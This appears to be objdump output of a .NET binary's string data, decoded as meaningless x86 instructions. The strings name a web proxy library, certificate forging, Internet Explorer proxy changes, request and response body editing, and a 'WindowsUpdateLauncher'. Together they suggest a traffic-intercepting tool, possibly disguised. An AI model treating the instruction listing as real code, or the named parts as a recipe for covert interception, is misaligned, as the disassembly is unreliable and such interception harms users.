  406f1b:	36 34 53             	ss xor $0x53,%al
  406f1e:	74 72                	je     0x406f92
  406f20:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  406f27:	74 72                	je     0x406f9b
  406f29:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  406f30:	52                   	push   %edx
  406f31:	65 71 75             	gs jno 0x406fa9
  406f34:	65 73 74             	gs jae 0x406fab
  406f37:	42                   	inc    %edx
  406f38:	6f                   	outsl  %ds:(%esi),(%dx)
  406f39:	64 79 41             	fs jns 0x406f7d
  406f3c:	73 53                	jae    0x406f91
  406f3e:	74 72                	je     0x406fb2
  406f40:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  406f47:	52                   	push   %edx
  406f48:	65 73 70             	gs jae 0x406fbb
  406f4b:	6f                   	outsl  %ds:(%esi),(%dx)
  406f4c:	6e                   	outsb  %ds:(%esi),(%dx)
  406f4d:	73 65                	jae    0x406fb4
  406f4f:	42                   	inc    %edx
  406f50:	6f                   	outsl  %ds:(%esi),(%dx)
  406f51:	64 79 53             	fs jns 0x406fa7
  406f54:	74 72                	je     0x406fc8
  406f56:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  406f5d:	73 74                	jae    0x406fd3
  406f5f:	72 69                	jb     0x406fca
  406f61:	6e                   	outsb  %ds:(%esi),(%dx)
  406f62:	67 00 4f 72          	add    %cl,0x72(%bx)
  406f66:	67 2e 42             	addr16 cs inc %edx
  406f69:	6f                   	outsl  %ds:(%esi),(%dx)
  406f6a:	75 6e                	jne    0x406fda
  406f6c:	63 79 43             	arpl   %edi,0x43(%ecx)
  406f6f:	61                   	popa
  406f70:	73 74                	jae    0x406fe6
  406f72:	6c                   	insb   (%dx),%es:(%edi)
  406f73:	65 2e 43             	gs cs inc %ebx
  406f76:	72 79                	jb     0x406ff1
  406f78:	70 74                	jo     0x406fee
  406f7a:	6f                   	outsl  %ds:(%esi),(%dx)
  406f7b:	2e 50                	cs push %eax
  406f7d:	72 6e                	jb     0x406fed
  406f7f:	67 00 69 73          	add    %ch,0x73(%bx,%di)
  406f83:	44                   	inc    %esp
  406f84:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  406f88:	00 64 65 62          	add    %ah,0x62(%ebp,%eiz,2)
  406f8c:	75 67                	jne    0x406ff5
  406f8e:	00 49 73             	add    %cl,0x73(%ecx)
  406f91:	4d                   	dec    %ebp
  406f92:	61                   	popa
  406f93:	74 63                	je     0x406ff8
  406f95:	68 00 43 6f 6d       	push   $0x6d6f4300
  406f9a:	70 75                	jo     0x407011
  406f9c:	74 65                	je     0x407003
  406f9e:	48                   	dec    %eax
  406f9f:	61                   	popa
  406fa0:	73 68                	jae    0x40700a
  406fa2:	00 4f 72             	add    %cl,0x72(%edi)
  406fa5:	67 2e 42             	addr16 cs inc %edx
  406fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  406fa9:	75 6e                	jne    0x407019
  406fab:	63 79 43             	arpl   %edi,0x43(%ecx)
  406fae:	61                   	popa
  406faf:	73 74                	jae    0x407025
  406fb1:	6c                   	insb   (%dx),%es:(%edi)
  406fb2:	65 2e 4d             	gs cs dec %ebp
  406fb5:	61                   	popa
  406fb6:	74 68                	je     0x407020
  406fb8:	00 75 73             	add    %dh,0x73(%ebp)
  406fbb:	65 72 50             	gs jb  0x40700e
  406fbe:	61                   	popa
  406fbf:	74 68                	je     0x407029
  406fc1:	00 64 77 42          	add    %ah,0x42(%edi,%esi,2)
  406fc5:	75 66                	jne    0x40702d
  406fc7:	66 65 72 4c          	data16 gs jb 0x407017
  406fcb:	65 6e                	outsb  %gs:(%esi),(%dx)
  406fcd:	67 74 68             	addr16 je 0x407038
  406fd0:	00 6b 65             	add    %ch,0x65(%ebx)
  406fd3:	79 53                	jns    0x407028
  406fd5:	74 72                	je     0x407049
  406fd7:	65 6e                	outsb  %gs:(%esi),(%dx)
  406fd9:	67 74 68             	addr16 je 0x407044
  406fdc:	00 49 64             	add    %cl,0x64(%ecx)
  406fdf:	4b                   	dec    %ebx
  406fe0:	50                   	push   %eax
  406fe1:	53                   	push   %ebx
  406fe2:	65 72 76             	gs jb  0x40705b
  406fe5:	65 72 41             	gs jb  0x407029
  406fe8:	75 74                	jne    0x40705e
  406fea:	68 00 67 65 74       	push   $0x74656700
  406fef:	5f                   	pop    %edi
  406ff0:	41                   	inc    %ecx
  406ff1:	62 73 6f             	bound  %esi,0x6f(%ebx)
  406ff4:	6c                   	insb   (%dx),%es:(%edi)
  406ff5:	75 74                	jne    0x40706b
  406ff7:	65 55                	gs push %ebp
  406ff9:	72 69                	jb     0x407064
  406ffb:	00 67 65             	add    %ah,0x65(%edi)
  406ffe:	74 5f                	je     0x40705f
  407000:	52                   	push   %edx
  407001:	65 71 75             	gs jno 0x407079
  407004:	65 73 74             	gs jae 0x40707b
  407007:	55                   	push   %ebp
  407008:	72 69                	jb     0x407073
  40700a:	00 4f 6b             	add    %cl,0x6b(%edi)
  40700d:	00 49 50             	add    %cl,0x50(%ecx)
  407010:	76 36                	jbe    0x407048
  407012:	4c                   	dec    %esp
  407013:	6f                   	outsl  %ds:(%esi),(%dx)
  407014:	6f                   	outsl  %ds:(%esi),(%dx)
  407015:	70 62                	jo     0x407079
  407017:	61                   	popa
  407018:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40701b:	6c                   	insb   (%dx),%es:(%edi)
  40701c:	6f                   	outsl  %ds:(%esi),(%dx)
  40701d:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  407020:	67 65 74 5f          	addr16 gs je 0x407083
  407024:	54                   	push   %esp
  407025:	61                   	popa
  407026:	73 6b                	jae    0x407093
  407028:	00 77 69             	add    %dh,0x69(%edi)
  40702b:	6e                   	outsb  %ds:(%esi),(%dx)
  40702c:	69 6e 65 74 2e 64 6c 	imul   $0x6c642e74,0x65(%esi),%ebp
  407033:	6c                   	insb   (%dx),%es:(%edi)
  407034:	00 73 65             	add    %dh,0x65(%ebx)
  407037:	74 5f                	je     0x407098
  407039:	45                   	inc    %ebp
  40703a:	6e                   	outsb  %ds:(%esi),(%dx)
  40703b:	61                   	popa
  40703c:	62 6c 65 43          	bound  %ebp,0x43(%ebp,%eiz,2)
  407040:	6f                   	outsl  %ds:(%esi),(%dx)
  407041:	6e                   	outsb  %ds:(%esi),(%dx)
  407042:	6e                   	outsb  %ds:(%esi),(%dx)
  407043:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407048:	6e                   	outsb  %ds:(%esi),(%dx)
  407049:	50                   	push   %eax
  40704a:	6f                   	outsl  %ds:(%esi),(%dx)
  40704b:	6f                   	outsl  %ds:(%esi),(%dx)
  40704c:	6c                   	insb   (%dx),%es:(%edi)
  40704d:	00 67 65             	add    %ah,0x65(%edi)
  407050:	74 5f                	je     0x4070b1
  407052:	55                   	push   %ebp
  407053:	72 6c                	jb     0x4070c1
  407055:	00 6f 72             	add    %ch,0x72(%edi)
  407058:	69 67 69 6e 61 6c 50 	imul   $0x506c616e,0x69(%edi),%esp
  40705f:	72 6f                	jb     0x4070d0
  407061:	78 79                	js     0x4070dc
  407063:	55                   	push   %ebp
  407064:	72 6c                	jb     0x4070d2
  407066:	00 4f 72             	add    %cl,0x72(%edi)
  407069:	67 2e 42             	addr16 cs inc %edx
  40706c:	6f                   	outsl  %ds:(%esi),(%dx)
  40706d:	75 6e                	jne    0x4070dd
  40706f:	63 79 43             	arpl   %edi,0x43(%ecx)
  407072:	61                   	popa
  407073:	73 74                	jae    0x4070e9
  407075:	6c                   	insb   (%dx),%es:(%edi)
  407076:	65 2e 4f             	gs cs dec %edi
  407079:	70 65                	jo     0x4070e0
  40707b:	6e                   	outsb  %ds:(%esi),(%dx)
  40707c:	53                   	push   %ebx
  40707d:	73 6c                	jae    0x4070eb
  40707f:	00 73 65             	add    %dh,0x65(%ebx)
  407082:	74 5f                	je     0x4070e3
  407084:	44                   	inc    %esp
  407085:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  407089:	70 74                	jo     0x4070ff
  40708b:	53                   	push   %ebx
  40708c:	73 6c                	jae    0x4070fa
  40708e:	00 67 65             	add    %ah,0x65(%edi)
  407091:	74 5f                	je     0x4070f2
  407093:	4f                   	dec    %edi
  407094:	75 74                	jne    0x40710a
  407096:	70 75                	jo     0x40710d
  407098:	74 53                	je     0x4070ed
  40709a:	74 72                	je     0x40710e
  40709c:	65 61                	gs popa
  40709e:	6d                   	insl   (%dx),%es:(%edi)
  40709f:	00 4d 65             	add    %cl,0x65(%ebp)
  4070a2:	6d                   	insl   (%dx),%es:(%edi)
  4070a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4070a4:	72 79                	jb     0x40711f
  4070a6:	53                   	push   %ebx
  4070a7:	74 72                	je     0x40711b
  4070a9:	65 61                	gs popa
  4070ab:	6d                   	insl   (%dx),%es:(%edi)
  4070ac:	00 50 72             	add    %dl,0x72(%eax)
  4070af:	6f                   	outsl  %ds:(%esi),(%dx)
  4070b0:	67 72 61             	addr16 jb 0x407114
  4070b3:	6d                   	insl   (%dx),%es:(%edi)
  4070b4:	00 67 65             	add    %ah,0x65(%edi)
  4070b7:	74 5f                	je     0x407118
  4070b9:	49                   	dec    %ecx
  4070ba:	74 65                	je     0x407121
  4070bc:	6d                   	insl   (%dx),%es:(%edi)
  4070bd:	00 73 65             	add    %dh,0x65(%ebx)
  4070c0:	74 5f                	je     0x407121
  4070c2:	49                   	dec    %ecx
  4070c3:	74 65                	je     0x40712a
  4070c5:	6d                   	insl   (%dx),%es:(%edi)
  4070c6:	00 53 79             	add    %dl,0x79(%ebx)
  4070c9:	73 74                	jae    0x40713f
  4070cb:	65 6d                	gs insl (%dx),%es:(%edi)
  4070cd:	00 73 69             	add    %dh,0x69(%ebx)
  4070d0:	67 6e                	outsb  %ds:(%si),(%dx)
  4070d2:	61                   	popa
  4070d3:	74 75                	je     0x40714a
  4070d5:	72 65                	jb     0x40713c
  4070d7:	41                   	inc    %ecx
  4070d8:	6c                   	insb   (%dx),%es:(%edi)
  4070d9:	67 6f                	outsl  %ds:(%si),(%dx)
  4070db:	72 69                	jb     0x407146
  4070dd:	74 68                	je     0x407147
  4070df:	6d                   	insl   (%dx),%es:(%edi)
  4070e0:	00 48 61             	add    %cl,0x61(%eax)
  4070e3:	73 68                	jae    0x40714d
  4070e5:	41                   	inc    %ecx
  4070e6:	6c                   	insb   (%dx),%es:(%edi)
  4070e7:	67 6f                	outsl  %ds:(%si),(%dx)
  4070e9:	72 69                	jb     0x407154
  4070eb:	74 68                	je     0x407155
  4070ed:	6d                   	insl   (%dx),%es:(%edi)
  4070ee:	00 53 65             	add    %dl,0x65(%ebx)
  4070f1:	6d                   	insl   (%dx),%es:(%edi)
  4070f2:	61                   	popa
  4070f3:	70 68                	jo     0x40715d
  4070f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4070f6:	72 65                	jb     0x40715d
  4070f8:	53                   	push   %ebx
  4070f9:	6c                   	insb   (%dx),%es:(%edi)
  4070fa:	69 6d 00 54 72 69 6d 	imul   $0x6d697254,0x0(%ebp),%ebp
  407101:	00 53 65             	add    %dl,0x65(%ebx)
  407104:	63 75 72             	arpl   %esi,0x72(%ebp)
  407107:	65 52                	gs push %edx
  407109:	61                   	popa
  40710a:	6e                   	outsb  %ds:(%esi),(%dx)
  40710b:	64 6f                	outsl  %fs:(%esi),(%dx)
  40710d:	6d                   	insl   (%dx),%es:(%edi)
  40710e:	00 76 61             	add    %dh,0x61(%esi)
  407111:	6c                   	insb   (%dx),%es:(%edi)
  407112:	69 64 46 72 6f 6d 00 	imul   $0x73006d6f,0x72(%esi,%eax,2),%esp
  407119:	73 
  40711a:	53                   	push   %ebx
  40711b:	75 62                	jne    0x40717f
  40711d:	6a 65                	push   $0x65
  40711f:	63 74 43 6e          	arpl   %esi,0x6e(%ebx,%eax,2)
  407123:	00 43 61             	add    %al,0x61(%ebx)
  407126:	6e                   	outsb  %ds:(%esi),(%dx)
  407127:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  40712a:	6c                   	insb   (%dx),%es:(%edi)
  40712b:	61                   	popa
  40712c:	74 69                	je     0x407197
  40712e:	6f                   	outsl  %ds:(%esi),(%dx)
  40712f:	6e                   	outsb  %ds:(%esi),(%dx)
  407130:	54                   	push   %esp
  407131:	6f                   	outsl  %ds:(%esi),(%dx)
  407132:	6b 65 6e 00          	imul   $0x0,0x6e(%ebp),%esp
  407136:	4f                   	dec    %edi
  407137:	70 65                	jo     0x40719e
  407139:	6e                   	outsb  %ds:(%esi),(%dx)
  40713a:	00 4d 61             	add    %cl,0x61(%ebp)
  40713d:	69 6e 00 41 64 64 45 	imul   $0x45646441,0x0(%esi),%ebp
  407144:	78 74                	js     0x4071ba
  407146:	65 6e                	outsb  %gs:(%esi),(%dx)
  407148:	73 69                	jae    0x4071b3
  40714a:	6f                   	outsl  %ds:(%esi),(%dx)
  40714b:	6e                   	outsb  %ds:(%esi),(%dx)
  40714c:	00 53 74             	add    %dl,0x74(%ebx)
  40714f:	6f                   	outsl  %ds:(%esi),(%dx)
  407150:	72 65                	jb     0x4071b7
  407152:	4c                   	dec    %esp
  407153:	6f                   	outsl  %ds:(%esi),(%dx)
  407154:	63 61 74             	arpl   %esp,0x74(%ecx)
  407157:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40715e:	74 65                	je     0x4071c5
  407160:	6d                   	insl   (%dx),%es:(%edi)
  407161:	2e 52                	cs push %edx
  407163:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  407166:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40716b:	6e                   	outsb  %ds:(%esi),(%dx)
  40716c:	00 48 65             	add    %cl,0x65(%eax)
  40716f:	61                   	popa
  407170:	64 65 72 43          	fs gs jb 0x4071b7
  407174:	6f                   	outsl  %ds:(%esi),(%dx)
  407175:	6c                   	insb   (%dx),%es:(%edi)
  407176:	6c                   	insb   (%dx),%es:(%edi)
  407177:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40717c:	6e                   	outsb  %ds:(%esi),(%dx)
  40717d:	00 48 74             	add    %cl,0x74(%eax)
  407180:	74 70                	je     0x4071f2
  407182:	4c                   	dec    %esp
  407183:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  40718a:	50                   	push   %eax
  40718b:	72 65                	jb     0x4071f2
  40718d:	66 69 78 43 6f 6c    	imul   $0x6c6f,0x43(%eax),%di
  407193:	6c                   	insb   (%dx),%es:(%edi)
  407194:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407199:	6e                   	outsb  %ds:(%esi),(%dx)
  40719a:	00 6f 70             	add    %ch,0x70(%edi)
  40719d:	5f                   	pop    %edi
  40719e:	41                   	inc    %ecx
  40719f:	64 64 69 74 69 6f 6e 	fs imul $0x6e49006e,%fs:0x6f(%ecx,%ebp,2),%esi
  4071a6:	00 49 6e 
  4071a9:	74 65                	je     0x407210
  4071ab:	72 6e                	jb     0x40721b
  4071ad:	65 74 53             	gs je  0x407203
  4071b0:	65 74 4f             	gs je  0x407202
  4071b3:	70 74                	jo     0x407229
  4071b5:	69 6f 6e 00 64 77 4f 	imul   $0x4f776400,0x6e(%edi),%ebp
  4071bc:	70 74                	jo     0x407232
  4071be:	69 6f 6e 00 50 65 6d 	imul   $0x6d655000,0x6e(%edi),%ebp
  4071c5:	45                   	inc    %ebp
  4071c6:	78 63                	js     0x40722b
  4071c8:	65 70 74             	gs jo  0x40723f
  4071cb:	69 6f 6e 00 50 72 6f 	imul   $0x6f725000,0x6e(%edi),%ebp
  4071d2:	78 79                	js     0x40724d
  4071d4:	48                   	dec    %eax
  4071d5:	74 74                	je     0x40724b
  4071d7:	70 45                	jo     0x40721e
  4071d9:	78 63                	js     0x40723e
  4071db:	65 70 74             	gs jo  0x407252
  4071de:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  4071e5:	5f                   	pop    %edi
  4071e6:	49                   	dec    %ecx
  4071e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4071e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4071e9:	65 72 45             	gs jb  0x407231
  4071ec:	78 63                	js     0x407251
  4071ee:	65 70 74             	gs jo  0x407265
  4071f1:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  4071f8:	45                   	inc    %ebp
  4071f9:	78 63                	js     0x40725e
  4071fb:	65 70 74             	gs jo  0x407272
  4071fe:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  407205:	75 6d                	jne    0x407274
  407207:	65 6e                	outsb  %gs:(%esi),(%dx)
  407209:	74 45                	je     0x407250
  40720b:	78 63                	js     0x407270
  40720d:	65 70 74             	gs jo  0x407284
  407210:	69 6f 6e 00 65 78 63 	imul   $0x63786500,0x6e(%edi),%ebp
  407217:	65 70 74             	gs jo  0x40728e
  40721a:	69 6f 6e 00 73 65 74 	imul   $0x74657300,0x6e(%edi),%ebp
  407221:	5f                   	pop    %edi
  407222:	53                   	push   %ebx
  407223:	74 61                	je     0x407286
  407225:	74 75                	je     0x40729c
  407227:	73 44                	jae    0x40726d
  407229:	65 73 63             	gs jae 0x40728f
  40722c:	72 69                	jb     0x407297
  40722e:	70 74                	jo     0x4072a4
  407230:	69 6f 6e 00 76 61 6c 	imul   $0x6c617600,0x6e(%edi),%ebp
  407237:	69 64 54 6f 00 4d 65 	imul   $0x6d654d00,0x6f(%esp,%edx,2),%esp
  40723e:	6d 
  40723f:	62 65 72             	bound  %esp,0x72(%ebp)
  407242:	49                   	dec    %ecx
  407243:	6e                   	outsb  %ds:(%esi),(%dx)
  407244:	66 6f                	outsw  %ds:(%esi),(%dx)
  407246:	00 67 65             	add    %ah,0x65(%edi)
  407249:	74 5f                	je     0x4072aa
  40724b:	53                   	push   %ebx
  40724c:	74 61                	je     0x4072af
  40724e:	72 74                	jb     0x4072c4
  407250:	49                   	dec    %ecx
  407251:	6e                   	outsb  %ds:(%esi),(%dx)
  407252:	66 6f                	outsw  %ds:(%esi),(%dx)
  407254:	00 50 72             	add    %dl,0x72(%eax)
  407257:	6f                   	outsl  %ds:(%esi),(%dx)
  407258:	63 65 73             	arpl   %esp,0x73(%ebp)
  40725b:	73 53                	jae    0x4072b0
  40725d:	74 61                	je     0x4072c0
  40725f:	72 74                	jb     0x4072d5
  407261:	49                   	dec    %ecx
  407262:	6e                   	outsb  %ds:(%esi),(%dx)
  407263:	66 6f                	outsw  %ds:(%esi),(%dx)
  407265:	00 43 72             	add    %al,0x72(%ebx)
  407268:	65 61                	gs popa
  40726a:	74 65                	je     0x4072d1
  40726c:	50                   	push   %eax
  40726d:	72 69                	jb     0x4072d8
  40726f:	76 61                	jbe    0x4072d2
  407271:	74 65                	je     0x4072d8
  407273:	4b                   	dec    %ebx
  407274:	65 79 49             	gs jns 0x4072c0
  407277:	6e                   	outsb  %ds:(%esi),(%dx)
  407278:	66 6f                	outsw  %ds:(%esi),(%dx)
  40727a:	00 5a 65             	add    %bl,0x65(%edx)
  40727d:	72 6f                	jb     0x4072ee
  40727f:	00 4f 72             	add    %cl,0x72(%edi)
  407282:	67 2e 42             	addr16 cs inc %edx
  407285:	6f                   	outsl  %ds:(%esi),(%dx)
  407286:	75 6e                	jne    0x4072f6
  407288:	63 79 43             	arpl   %edi,0x43(%ecx)
  40728b:	61                   	popa
  40728c:	73 74                	jae    0x407302
  40728e:	6c                   	insb   (%dx),%es:(%edi)
  40728f:	65 2e 43             	gs cs inc %ebx
  407292:	72 79                	jb     0x40730d
  407294:	70 74                	jo     0x40730a
  407296:	6f                   	outsl  %ds:(%esi),(%dx)
  407297:	00 66 6c             	add    %ah,0x6c(%esi)
  40729a:	61                   	popa
  40729b:	67 53                	addr16 push %ebx
  40729d:	74 65                	je     0x407304
  40729f:	70 00                	jo     0x4072a1
  4072a1:	50                   	push   %eax
  4072a2:	72 69                	jb     0x40730d
  4072a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4072a5:	74 48                	je     0x4072ef
  4072a7:	65 6c                	gs insb (%dx),%es:(%edi)
  4072a9:	70 00                	jo     0x4072ab
  4072ab:	53                   	push   %ebx
  4072ac:	74 6f                	je     0x40731d
  4072ae:	70 00                	jo     0x4072b0
  4072b0:	54                   	push   %esp
  4072b1:	69 74 61 6e 69 75 6d 	imul   $0x2e6d7569,0x6e(%ecx,%eiz,2),%esi
  4072b8:	2e 
  4072b9:	57                   	push   %edi
  4072ba:	65 62 2e             	bound  %ebp,%gs:(%esi)
  4072bd:	50                   	push   %eax
  4072be:	72 6f                	jb     0x40732f
  4072c0:	78 79                	js     0x40733b
  4072c2:	2e 48                	cs dec %eax
  4072c4:	74 74                	je     0x40733a
  4072c6:	70 00                	jo     0x4072c8
  4072c8:	53                   	push   %ebx
  4072c9:	79 73                	jns    0x40733e
  4072cb:	74 65                	je     0x407332
  4072cd:	6d                   	insl   (%dx),%es:(%edi)
  4072ce:	2e 58                	cs pop %eax
  4072d0:	6d                   	insl   (%dx),%es:(%edi)
  4072d1:	6c                   	insb   (%dx),%es:(%edi)
  4072d2:	2e 4c                	cs dec %esp
  4072d4:	69 6e 71 00 53 79 73 	imul   $0x73795300,0x71(%esi),%ebp
  4072db:	74 65                	je     0x407342
  4072dd:	6d                   	insl   (%dx),%es:(%edi)
  4072de:	2e 4c                	cs dec %esp
  4072e0:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  4072e7:	72 00                	jb     0x4072e9
  4072e9:	53                   	push   %ebx
  4072ea:	65 74 53             	gs je  0x407340
  4072ed:	65 72 69             	gs jb  0x407359
  4072f0:	61                   	popa
  4072f1:	6c                   	insb   (%dx),%es:(%edi)
  4072f2:	4e                   	dec    %esi
  4072f3:	75 6d                	jne    0x407362
  4072f5:	62 65 72             	bound  %esp,0x72(%ebp)
  4072f8:	00 48 74             	add    %cl,0x74(%eax)
  4072fb:	74 70                	je     0x40736d
  4072fd:	48                   	dec    %eax
  4072fe:	65 61                	gs popa
  407300:	64 65 72 00          	fs gs jb 0x407304
  407304:	53                   	push   %ebx
  407305:	48                   	dec    %eax
  407306:	41                   	inc    %ecx
  407307:	31 43 72             	xor    %eax,0x72(%ebx)
  40730a:	79 70                	jns    0x40737c
  40730c:	74 6f                	je     0x40737d
  40730e:	53                   	push   %ebx
  40730f:	65 72 76             	gs jb  0x407388
  407312:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  407319:	69 64 65 72 00 53 48 	imul   $0x41485300,0x72(%ebp,%eiz,2),%esp
  407320:	41 
  407321:	32 35 36 43 72 79    	xor    0x79724336,%dh
  407327:	70 74                	jo     0x40739d
  407329:	6f                   	outsl  %ds:(%esi),(%dx)
  40732a:	53                   	push   %ebx
  40732b:	65 72 76             	gs jb  0x4073a4
  40732e:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  407335:	69 64 65 72 00 41 73 	imul   $0x79734100,0x72(%ebp,%eiz,2),%esp
  40733c:	79 
  40733d:	6e                   	outsb  %ds:(%esi),(%dx)
  40733e:	63 56 6f             	arpl   %edx,0x6f(%esi)
  407341:	69 64 4d 65 74 68 6f 	imul   $0x646f6874,0x65(%ebp,%ecx,2),%esp
  407348:	64 
  407349:	42                   	inc    %edx
  40734a:	75 69                	jne    0x4073b5
  40734c:	6c                   	insb   (%dx),%es:(%edi)
  40734d:	64 65 72 00          	fs gs jb 0x407351
  407351:	41                   	inc    %ecx
  407352:	73 79                	jae    0x4073cd
  407354:	6e                   	outsb  %ds:(%esi),(%dx)
  407355:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  407359:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  40735d:	68 6f 64 42 75       	push   $0x7542646f
  407362:	69 6c 64 65 72 00 3c 	imul   $0x3e3c0072,0x65(%esp,%eiz,2),%ebp
  407369:	3e 
  40736a:	74 5f                	je     0x4073cb
  40736c:	5f                   	pop    %edi
  40736d:	62 75 69             	bound  %esi,0x69(%ebp)
  407370:	6c                   	insb   (%dx),%es:(%edi)
  407371:	64 65 72 00          	fs gs jb 0x407375
  407375:	73 65                	jae    0x4073dc
  407377:	6e                   	outsb  %ds:(%esi),(%dx)
  407378:	64 65 72 00          	fs gs jb 0x40737c
  40737c:	6c                   	insb   (%dx),%es:(%edi)
  40737d:	70 42                	jo     0x4073c1
  40737f:	75 66                	jne    0x4073e7
  407381:	66 65 72 00          	data16 gs jb 0x407385
  407385:	49                   	dec    %ecx
  407386:	6e                   	outsb  %ds:(%esi),(%dx)
  407387:	74 65                	je     0x4073ee
  407389:	72 6e                	jb     0x4073f9
  40738b:	65 74 45             	gs je  0x4073d3
  40738e:	78 70                	js     0x407400
  407390:	6c                   	insb   (%dx),%es:(%edi)
  407391:	6f                   	outsl  %ds:(%esi),(%dx)
  407392:	72 65                	jb     0x4073f9
  407394:	72 50                	jb     0x4073e6
  407396:	72 6f                	jb     0x407407
  407398:	78 79                	js     0x407413
  40739a:	4d                   	dec    %ebp
  40739b:	61                   	popa
  40739c:	6e                   	outsb  %ds:(%esi),(%dx)
  40739d:	61                   	popa
  40739e:	67 65 72 00          	addr16 gs jb 0x4073a2
  4073a2:	70 72                	jo     0x407416
  4073a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4073a5:	78 79                	js     0x407420
  4073a7:	4d                   	dec    %ebp
  4073a8:	61                   	popa
  4073a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4073aa:	61                   	popa
  4073ab:	67 65 72 00          	addr16 gs jb 0x4073af
  4073af:	42                   	inc    %edx
  4073b0:	69 67 49 6e 74 65 67 	imul   $0x6765746e,0x49(%edi),%esp
  4073b7:	65 72 00             	gs jb  0x4073ba
  4073ba:	57                   	push   %edi
  4073bb:	69 6e 64 6f 77 73 55 	imul   $0x5573776f,0x64(%esi),%ebp
  4073c2:	70 64                	jo     0x407428
  4073c4:	61                   	popa
  4073c5:	74 65                	je     0x40742c
  4073c7:	4c                   	dec    %esp
  4073c8:	61                   	popa
  4073c9:	75 6e                	jne    0x407439
  4073cb:	63 68 65             	arpl   %ebp,0x65(%eax)
  4073ce:	72 00                	jb     0x4073d0
  4073d0:	44                   	inc    %esp
  4073d1:	65 72 4f             	gs jb  0x407423
  4073d4:	62 6a 65             	bound  %ebp,0x65(%edx)
  4073d7:	63 74 49 64          	arpl   %esi,0x64(%ecx,%ecx,2)
  4073db:	65 6e                	outsb  %gs:(%esi),(%dx)
  4073dd:	74 69                	je     0x407448
  4073df:	66 69 65 72 00 43    	imul   $0x4300,0x72(%ebp),%sp
  4073e5:	65 72 74             	gs jb  0x40745c
  4073e8:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4073ef:	4d                   	dec    %ebp
  4073f0:	61                   	popa
  4073f1:	6b 65 72 00          	imul   $0x0,0x72(%ebp),%esp
  4073f5:	52                   	push   %edx
  4073f6:	65 73 6f             	gs jae 0x407468
  4073f9:	75 72                	jne    0x40746d
  4073fb:	63 65 48             	arpl   %esp,0x48(%ebp)
  4073fe:	61                   	popa
  4073ff:	6e                   	outsb  %ds:(%esi),(%dx)
  407400:	64 6c                	fs insb (%dx),%es:(%edi)
  407402:	65 72 00             	gs jb  0x407405
  407405:	45                   	inc    %ebp
  407406:	78 63                	js     0x40746b
  407408:	65 70 74             	gs jo  0x40747f
  40740b:	69 6f 6e 48 61 6e 64 	imul   $0x646e6148,0x6e(%edi),%ebp
  407412:	6c                   	insb   (%dx),%es:(%edi)
  407413:	65 72 00             	gs jb  0x407416
  407416:	48                   	dec    %eax
  407417:	74 74                	je     0x40748d
  407419:	70 4c                	jo     0x407467
  40741b:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  407422:	00 6c 69 73          	add    %ch,0x73(%ecx,%ebp,2)
  407426:	74 65                	je     0x40748d
  407428:	6e                   	outsb  %ds:(%esi),(%dx)
  407429:	65 72 00             	gs jb  0x40742c
  40742c:	58                   	pop    %eax
  40742d:	43                   	inc    %ebx
  40742e:	6f                   	outsl  %ds:(%esi),(%dx)
  40742f:	6e                   	outsb  %ds:(%esi),(%dx)
  407430:	74 61                	je     0x407493
  407432:	69 6e 65 72 00 41 72 	imul   $0x72410072,0x65(%esi),%ebp
  407439:	67 75 6d             	addr16 jne 0x4074a9
  40743c:	65 6e                	outsb  %gs:(%esi),(%dx)
  40743e:	74 73                	je     0x4074b3
  407440:	50                   	push   %eax
  407441:	61                   	popa
  407442:	72 73                	jb     0x4074b7
  407444:	65 72 00             	gs jb  0x407447
  407447:	41                   	inc    %ecx
  407448:	73 79                	jae    0x4074c3
  40744a:	6d                   	insl   (%dx),%es:(%edi)
  40744b:	6d                   	insl   (%dx),%es:(%edi)
  40744c:	65 74 72             	gs je  0x4074c1
  40744f:	69 63 4b 65 79 50 61 	imul   $0x61507965,0x4b(%ebx),%esp
  407456:	72 61                	jb     0x4074b9
  407458:	6d                   	insl   (%dx),%es:(%edi)
  407459:	65 74 65             	gs je  0x4074c1
  40745c:	72 00                	jb     0x40745e
  40745e:	53                   	push   %ebx
  40745f:	65 74 4e             	gs je  0x4074b0
  407462:	6f                   	outsl  %ds:(%esi),(%dx)
  407463:	74 41                	je     0x4074a6
  407465:	66 74 65             	data16 je 0x4074cd
  407468:	72 00                	jb     0x40746a
  40746a:	54                   	push   %esp
  40746b:	61                   	popa
